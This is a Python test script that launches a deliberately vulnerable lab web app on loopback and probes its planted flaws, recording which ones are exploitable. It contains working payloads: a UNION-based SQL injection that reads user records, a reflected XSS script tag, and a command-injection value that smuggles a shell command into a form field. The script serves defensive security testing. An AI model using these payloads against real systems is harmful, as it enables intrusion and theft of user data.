#!/usr/bin/env python3
"""Exercise the planted vulnerabilities of OUR OWN lab app at runtime and record what happened (brief, Week 1:
"document the baseline vulnerabilities at runtime").

  python3 scripts/runtime_baseline.py [--out artifacts/evidence/runtime/2026-10-29-runtime-baseline.json]

Starts apps/vulnshop-api from a temporary copy on 127.0.0.1 only (random port), sends a handful of requests, stops it.
Needs Flask (`pip install flask`). The command-injection probe only runs `touch` on a marker file under the temp directory.
Lab-only: it refuses any host other than loopback. Writes JSON; docs/BASELINE_VULNERABILITY_REPORT.md quotes it.
"""
import argparse
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "apps" / "vulnshop-api"
HOST = "127.0.0.1"


def free_port() -> int:
    with socket.socket() as s:
        s.bind((HOST, 0))
        return s.getsockname()[1]


def http(method, url, body=None, timeout=10):
    assert urllib.parse.urlsplit(url).hostname == HOST, "lab only: loopback targets only"
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={"Content-Type": "application/json"} if data else {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")


class Server:
    def __init__(self, workdir: Path, debug: str):
        self.port = free_port()
        env = {**os.environ, "APP_PORT": str(self.port), "DEBUG": debug, "PYTHONDONTWRITEBYTECODE": "1"}
        self.proc = subprocess.Popen([sys.executable, "app.py"], cwd=workdir, env=env, stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL, start_new_session=True)
        self.base = f"http://{HOST}:{self.port}"
        for _ in range(60):
            try:
                if http("GET", self.base + "/healthz")[0] == 200:
                    return
            except OSError:
                time.sleep(0.25)
        raise RuntimeError("app did not start (is Flask installed?)")

    def stop(self):
        os.killpg(self.proc.pid, signal.SIGTERM)


def probes(base: str, marker: Path, debug_label: str) -> list:
    out = []

    def rec(pid, name, request, observed, exploitable, note=""):
        out.append({"planted": pid, "name": name, "request": request, "observed": observed, "exploitable": exploitable, "note": note})

    s, _, b = http("GET", base + "/healthz")
    rec("-", "Health endpoint (control)", "GET /healthz", f"HTTP {s}", False, "a working service, not a vulnerability")

    payload = "' UNION SELECT 1,(SELECT username||':'||email FROM users LIMIT 1),'x',0,'y'--"
    s, _, b = http("GET", f"{base}/api/search/?q={urllib.parse.quote(payload)}")
    leaked = s == 200 and "admin:admin@vulnshop.local" in b
    rec("PLANT-001/010", "SQL injection (search): reads another table", "GET /api/search/?q=' UNION SELECT ... FROM users --",
        f"HTTP {s}; the users table row came back through the items endpoint: {leaked}", leaked)
    s, _, b = http("GET", f"{base}/api/search/?q={urllib.parse.quote(chr(39))}")
    rec("PLANT-001", "SQL error leaks the query", "GET /api/search/?q='", f"HTTP {s}, body echoes the SQL: {'query' in b}", s == 400 and "query" in b)

    s, h, b = http("GET", base + "/profile?username=" + urllib.parse.quote("<script>alert(1)</script>") + "&email=" + urllib.parse.quote("<b>x</b>"))
    rec("PLANT-008", "Reflected XSS (username, |safe)", "GET /profile?username=<script>alert(1)</script>", f"HTTP {s}, script tag reflected unescaped: {'<script>alert(1)</script>' in b}", "<script>alert(1)</script>" in b)
    rec("-", "Escaped field (email) as control", "GET /profile?email=<b>x</b>", f"escaped: {'&lt;b&gt;x&lt;/b&gt;' in b}", False, "email is auto-escaped, so only the |safe field is exploitable")

    marker.unlink(missing_ok=True)
    s, _, b = http("POST", base + "/api/pay/process", {"amount": 1, "receipt_id": f"x.log; touch {marker}; #"})
    rec("PLANT-004", "Command injection (receipt_id)", "POST /api/pay/process receipt_id='x.log; touch <marker>; #'", f"HTTP {s}, marker file created by the injected command: {marker.exists()}", marker.exists())
    marker.unlink(missing_ok=True)

    s, h, b = http("GET", base + "/api/user/" + urllib.parse.quote("1 OR 1=1"))
    rec("PLANT-002", "Negative control: parameterised lookup", "GET /api/user/1 OR 1=1", f"HTTP {s} (injection did not match any row)", s == 200, "parameterised query: not exploitable, as designed")
    rec("PLANT-009", "Negative control: X-Frame-Options", "GET /api/user/1", f"X-Frame-Options: {h.get('X-Frame-Options')}", h.get("X-Frame-Options") != "DENY", "header present: not exploitable, as designed")

    s, _, _ = http("GET", base + "/console")
    rec("PLANT-012", f"Werkzeug debug console (DEBUG={debug_label})", "GET /console", f"HTTP {s}", s == 200,
        "reachable only when debug mode is on; the hardened image sets DEBUG=0")
    return out


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", default=str(ROOT / "artifacts/evidence/runtime/2026-10-29-runtime-baseline.json"))
    a = ap.parse_args(argv)
    results = {}
    for label, debug in (("default (DEBUG=1, the vulnerable target)", "1"), ("hardened (DEBUG=0)", "0")):
        with tempfile.TemporaryDirectory() as d:
            work = Path(d) / "app"
            shutil.copytree(APP, work, ignore=shutil.ignore_patterns("node_modules", "__pycache__", "*.db"))
            srv = Server(work, debug)
            try:
                results[label] = probes(srv.base, Path(d) / "pf_cmdi_marker", debug)
            finally:
                srv.stop()
    doc = {"captured": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "target": "apps/vulnshop-api (local copy, loopback only)",
           "python": sys.version.split()[0], "runs": results}
    Path(a.out).parent.mkdir(parents=True, exist_ok=True)
    Path(a.out).write_text(json.dumps(doc, indent=2) + "\n", encoding="utf-8")
    for label, rows in results.items():
        print(f"\n== {label}")
        for r in rows:
            print(f"  [{'EXPLOITABLE' if r['exploitable'] else 'not exploitable'}] {r['name']}: {r['observed']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
